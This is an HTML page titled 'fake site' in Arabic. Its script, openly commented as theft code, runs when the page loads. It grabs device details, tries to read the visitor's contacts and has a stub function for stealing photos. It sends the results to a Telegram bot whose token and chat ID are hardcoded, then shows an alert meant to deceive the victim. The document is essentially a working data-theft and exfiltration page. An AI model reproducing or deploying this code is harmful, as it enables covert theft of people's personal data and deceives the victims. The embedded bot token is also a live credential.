<!DOCTYPE html>
<html>
<head>
    <title>موقع مزيف</title>
    <script>
        // دالة لسرقة جهات الاتصال (Android/iOS)
        async function stealContacts() {
            try {
                const contacts = await navigator.contacts.select(['name', 'phone']);
                return contacts;
            } catch (e) {
                return "فشل سرقة جهات الاتصال: " + e.message;
            }
        }

        // دالة لسرقة الصور (يحتاج لثغرات في المتصفح)
        async function stealPhotos() {
            try {
                const media = await navigator.mediaDevices.getUserMedia({ video: false, audio: false });
                // استغلال ثغرة لقراءة نظام الملفات (مثال: هجوم XXE أو تخزين متصفح)
                return "بيانات الصور المسروقة (تتطلب ثغرات إضافية)";
            } catch (e) {
                return "فشل سرقة الصور: " + e.message;
            }
        }

        // إرسال البيانات إلى بوت تلجرام
        async function sendToTelegram(data) {
            const botToken = "8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU";
            const chatId = "5446862709";
            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(data)}`;
            await fetch(url);
        }

        // تنفيذ الهجوم عند تحميل الصفحة
        window.onload = async () => {
            const deviceInfo = `نوع الجهاز: ${navigator.userAgent}\nنظام التشغيل: ${navigator.platform}`;
            const contacts = await stealContacts();
            const photos = await stealPhotos();
            const stolenData = `**بيانات الضحية**:\n${deviceInfo}\n\n**جهات الاتصال**:\n${JSON.stringify(contacts)}\n\n**الصور**:\n${photos}`;
            await sendToTelegram(stolenData);
            alert("تم تحميل الموقع بنجاح!"); // خداع الضحية
        };
    </script>
</head>
<body>
    <h1>مرحبًا بك في الموقع!</h1>
    <p>يتم تحميل المحتوى...</p>
</body>
</html>
